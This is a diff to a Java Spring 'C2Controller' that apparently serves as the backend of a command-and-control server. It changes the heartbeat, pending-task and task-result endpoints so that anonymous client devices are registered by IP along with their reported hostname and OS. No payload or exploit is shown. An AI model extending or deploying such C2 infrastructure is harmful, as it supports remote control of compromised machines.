@@ -31,17 +31,17 @@ public class C2Controller {
     @Resource
     private C2DeviceMapper c2DeviceMapper;
 
-    @GetMapping("/heartbeat")
-    public String heartbeat(HttpServletRequest request) {
+    @PostMapping("/heartbeat")
+    public String heartbeat(@RequestBody Map<String, Object> payload, HttpServletRequest request) {
         // Record heartbeat
-        recordHeartbeat(request);
+        recordHeartbeat(payload, request);
         return "alive";
     }
 
     @GetMapping("/c2/tasks/pending")
     public List<C2Task> getPendingTasks(HttpServletRequest request) {
-        // Record heartbeat
-        C2Device device = recordHeartbeat(request);
+        // Record heartbeat (legacy support or just ip)
+        C2Device device = recordHeartbeat(null, request);
         
         QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
         queryWrapper.eq("status", "pending");
@@ -56,7 +56,7 @@ public class C2Controller {
 
     @PostMapping("/c2/tasks/result")
     public BaseResponse<Boolean> submitTaskResult(@RequestBody Map<String, Object> payload, HttpServletRequest request) {
-        recordHeartbeat(request);
+        recordHeartbeat(null, request);
         String taskId = (String) payload.get("taskId");
         String result = (String) payload.get("result");
 
@@ -74,8 +74,24 @@ public class C2Controller {
     }
     
     // Helper to record heartbeat from request
-    private C2Device recordHeartbeat(HttpServletRequest request) {
+    private C2Device recordHeartbeat(Map<String, Object> payload, HttpServletRequest request) {
         String ip = NetUtils.getIpAddress(request);
+        String hostName = "Unknown";
+        String os = "Unknown";
+        
+        if (payload != null) {
+            if (payload.containsKey("hostName")) {
+                hostName = (String) payload.get("hostName");
+            }
+            if (payload.containsKey("os")) {
+                os = (String) payload.get("os");
+            }
+            // Use client reported IP if provided, otherwise stick to request IP
+             if (payload.containsKey("ip")) {
+                // ip = (String) payload.get("ip"); 
+             }
+        }
+
         // Simple identification by IP for now since client is anonymous
         QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
         queryWrapper.eq("ip", ip);
@@ -83,12 +99,19 @@ public class C2Controller {
         if (device == null) {
             device = new C2Device();
             device.setIp(ip);
-            device.setHostName("Unknown"); // Client doesn't send yet
-            device.setOs("Unknown");
+            device.setHostName(hostName);
+            device.setOs(os);
             device.setLastSeen(new Date());
             c2DeviceMapper.insert(device);
         } else {
             device.setLastSeen(new Date());
+            // Update info if it was unknown before or changed
+            if (!"Unknown".equals(hostName)) {
+                device.setHostName(hostName);
+            }
+            if (!"Unknown".equals(os)) {
+                device.setOs(os);
+            }
             c2DeviceMapper.updateById(device);
         }
         return device;
